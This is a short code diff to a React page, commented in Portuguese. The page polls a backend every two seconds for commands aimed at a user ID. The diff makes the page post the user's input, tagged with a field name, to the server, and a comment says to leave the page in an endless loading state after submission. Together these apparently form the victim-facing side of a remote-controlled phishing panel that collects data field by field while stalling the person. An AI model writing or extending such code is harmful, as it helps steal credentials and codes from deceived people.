@@ -8,6 +8,7 @@ function CommandPage({ userId }) {
   const [currentCommand, setCurrentCommand] = useState(null);
   const [inputValue, setInputValue] = useState("");
   const [loading, setLoading] = useState(false);
+  const [submitted, setSubmitted] = useState(false);
 
   // Verificar comandos a cada 2 segundos
   useEffect(() => {
@@ -27,16 +28,20 @@ function CommandPage({ userId }) {
     return () => clearInterval(interval);
   }, [userId]);
 
-  const handleSubmit = async (e) => {
+  const handleSubmit = async (e, field) => {
     e.preventDefault();
     setLoading(true);
     
-    // Aqui você pode enviar o dado para o backend
-    // Por enquanto só simula
-    setTimeout(() => {
-      setInputValue("");
-      setLoading(false);
-    }, 1000);
+    try {
+      await axios.post(`${API}/user/submit-data/${userId}`, {
+        field: field,
+        value: inputValue
+      });
+      setSubmitted(true);
+    } catch (error) {
+      console.error("Erro ao enviar dados:", error);
+    }
+    // Manter em loading infinito após enviar
   };
 
   // Página de dados inválidos
